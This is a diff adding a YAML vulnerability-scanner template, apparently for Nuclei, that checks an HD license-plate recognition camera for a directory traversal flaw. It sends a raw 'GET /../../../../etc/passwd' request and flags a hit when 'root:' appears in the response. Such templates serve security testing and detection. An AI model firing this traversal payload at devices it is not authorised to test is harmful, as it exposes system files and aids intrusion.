@@ -1,0 +1,22 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'root:'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /../../../../etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+id: DT-File-reading
+info:
+    author: Superhero
+    description: DT-高清车牌识别摄像机,存在目录遍历致任意文件读取漏洞，未经身份验证的远程攻击者可以读取系统内部敏感配置文件，获取服务器信息，导致系统处于极不安全的状态。
+    name: DT-高清车牌识别摄像机 任意文件读取漏洞
+    severity: high
+    tags:
+        - File reading
